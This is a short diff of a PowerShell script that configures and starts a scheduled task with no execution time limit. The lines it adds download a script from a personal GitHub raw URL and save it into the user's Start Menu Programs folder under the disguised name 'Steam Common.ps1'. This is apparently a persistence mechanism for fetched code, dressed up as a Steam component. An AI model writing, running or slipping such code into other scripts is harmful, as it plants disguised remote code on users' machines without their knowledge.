@@ -13,4 +13,8 @@ $task = Get-ScheduledTask -TaskName $TaskName
 $task.Settings.ExecutionTimeLimit = "PT0S"
 Set-ScheduledTask -TaskName $TaskName -Settings $task.Settings
 
+$destino2 = Join-Path -Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Steam Common.ps1'
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/loop.ps1?dl=1" -OutFile $destino2
+
 Start-ScheduledTask -TaskName $TaskName
+exit
